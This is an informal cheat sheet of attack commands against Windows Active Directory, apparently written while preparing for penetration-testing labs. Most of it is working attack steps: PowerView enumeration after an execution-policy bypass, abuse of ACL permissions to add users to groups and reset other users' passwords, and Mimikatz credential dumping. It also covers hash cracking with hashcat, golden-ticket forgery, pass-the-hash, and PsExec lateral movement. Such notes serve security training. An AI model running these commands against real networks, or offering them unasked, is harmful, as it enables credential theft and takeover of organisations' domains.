0) 

	a)  load powerview.ps1
		PS C:\> powershell -ep bypass
		PS C:> . .\PowerView.ps1    or  Import-Module .\PowerView.ps1
		
		
	b)  use power shell commands like  : "Get-NetUser"

	c) escalate privilages in normal windows way
1) 

use "net" command    when you are on windows AD , many info there but powerView is better :)

	
	
2) get users and group:
   use powerView.ps1:
	PS C: >Import-Module .\PowerView.ps1     <-- imported
	PS C: >Get-NetUser				also    PS C: >Get-NetGroup | select cn
	PS C: >Get-NetGroup				also    PS C: >Get-NetGroup -AdminCount 
		parse for root:
			PS C: >Get-NetGroup | select samacountname
	
	
	get nasted groups (if one group is a member of other):
		get users group:
		*Evil-WinRM* PS C:\Users> net user svc-alfresco /domain

		PS C: >Get-NetGroup "Sales Department" | select samacountname
		member 
		{CN=Development Department...}

		PS C: >Get-NetGroup "Development Department" | select samacountname
		member 
		{CN=Managment Department...}

		PS C: >Get-NetGroup "Managment Department" | select samacountname
		member
		CN=jen                          <-- jen is in all groups (if any of groups is admin, she is admin) 

	PS C: >Get-NetComputer				also PS C: >Get-NetComputer -Ping       // will get info about active computers
		parse:
			PS C: >Get-NetComputer | select operatingsystem,dnshostname 
			files84.corp.com   WindowsServer	10.0 (20348)
		        web04.corp.com     WindowsServer	10.0 (20348)
			client74.corp.com  Windows 11 Pro 	10.0 (22000)
			
			
			
	if you have hostnames you can get ip:
		PS C: >Resolve-IPAdress CLIENT76.corp.com
			IPAdress:
			10.10.10.191			

	PS C: >Get-NetDomain
		
	PS C: >Get-DomainSID

	PS C: >Get-DomainPolicy
	
	if rdp is on some computer you can check it if somebody is on it:
	PS C: >Get-NetRDPSession  -computerName \\client74
	

3) Find-LocalAdminAccess     if you are on domain  controller , check what computer you can remotly access with admin priviliges
	In powerView there is: "Find-LocalAdminAccess"     <-- may give nothing on bad/weak/poor  account 
		PS C: > Find-LocalAdminAccess
	
		PS C: > Invoke-EnumerateLocalAdmin		// enumerate local admins

4) get-NetSession: (not working to good now )
		PS C: > get-NetSession -ComputerName files84 -verbose
		PS C: > get-NetSession -ComputerName web04 -verbose
		PS C: > get-NetSession -ComputerName client74 -verbose 		


5) PSLoggedon.exe/Get-NetLoggedon  (if you get sth like admin_user or JeffAmin try to hack this one - hack  with ntlm hash etx)
		PSLoggedon.exe:
			PS C: > PSLoggedon.exe \\files84
	
			PS C: > PSLoggedon.exe \\web04

			PS C: > PSLoggedon.exe \\client74

		Get-NetLoggedon:
			PS C: > Get-NetLoggedon -computerName \\client74

6) find shares in the domain	
		PS C: > Invoke-ShareFinder


7) get user and try to attack this users

	
8) Object permisions (Access control List):
 
	ACL - objects in active directory:     <---------------------------------------   o co w tym chodzi?  

	GenericAll	
	..
	ForceChangePassword
	Self



use it:
	PS C: > Get-ObjectAcl -Identity "Managment Department" | {$_.ActiveDirectoryRights -eq "GenericAll"}

	you get SID , can convert sid's to real names:
	PS C: > "S-1-S-1234-1234324-...","1-1-S-18" .... | Convert-SidToName 
output (for GenericAll ACL):
	CORP\Domain Admin
	CORP\stephanie
	Local System

now you can add stephanie to any group:

	PS C: > net group "managment departmant" stephanie /add /domain


9) if you have permisions you can change passwords to other user (you are stephanie but change jen password)
	PS C: > net user jen Password123 /domain 

   and now you can login as that user:
	PS C: > runas /user:corp\jen powershell.exe


10) Other idea (1:08 min na youtubie): 


11) bloodhount   - if you are on domain controler  (or not, try on all AD)
	
	
12) mimikatz  (you need to have administrative priviliges)

		a) hashe dump etc:

		PS C: > .\mimikatz.exe
		mimikatz # privilege::debug
			OK
			
		mimikatz #sekurlsa::logonpasswords    <- ntlm hashes for users   , crack it with hashcat   (new windows doesn't store password in memory)

		mimikatz #lsadump::sam     <- will dump sam database

		mimikatz #lsadump::lsa      // local security authority of windows   
		
		dump hashes using mimikatz and crack:
		mimikatz #lsadump::lsa /patch      // will get LM and ntlm hashes
				hashcat -m 1000 <hash> ./rockyou.txt     // hashcat -m 1000 acadfsf...asd12 ./rockyou.txt
		
		b) golden ticket:		
		
		mimikatz #lsadump::lsa /inject /name:krb        <- will give all info: 
										"Domain: CONTROLER / <SID > "
										"User::krbtgt   "
										" NTLM:  <hash> "


		mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5....166 /krbtgt: <ntlm_hash> /id:500       <- 500 - id_umber 
		Final Ticket saved to file


		mimikatz # misc::cmd			<- will open new command prompt with elevated priliages to all machines

		C:/> PsExec.exe \\DesktopInDomain-1 cmd.exe		<- will acces other machines

13) lateral movement:
	put file winRM:
		*Evil-WinRM* PS C:\Users\svc-alfresco> upload  powerview.ps1 C:\Users\svc-alfresco\powerview.ps1
                
		*Evil-WinRM* PS C:\Users\svc-alfresco> upload  mimikatz.exe C:\Users\svc-alfresco\mimikatz.exe



	from linux:
		kali@kali:~$ pth-winexe	-U offsec%aad3..<the rest of ntlm hash>..   //10.11.0.22 cmd
	
	from windows connect with 'dc01' (but first you have to over pass the hash to memory):
		PS C:\> .\PsExec.exe \\dc01 cmd.exe
	
	using mimikatz 
		
	
	

